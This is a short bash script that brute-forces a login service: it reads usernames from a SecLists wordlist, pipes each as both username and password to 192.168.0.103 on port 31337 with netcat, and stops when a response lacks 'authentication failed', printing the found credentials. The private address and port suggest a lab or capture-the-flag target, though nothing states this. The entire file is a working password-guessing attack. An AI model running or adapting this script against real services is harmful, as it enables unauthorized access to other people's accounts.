#!/bin/bash

wordlist="/usr/share/seclists/Usernames/top-usernames-shortlist.txt"

while IFS= read -r user; do
  echo -ne "\r$user"
  tput el
  password="$user"
  response=$(echo -e "$user\n$password" | netcat 192.168.0.103 31337)
  echo "$response"
  if [[ "$response" != *"authentication failed"* ]]; then
    echo "Credentials found: Username $user and Password: $password"
    break 
  fi

done < "$wordlist" 
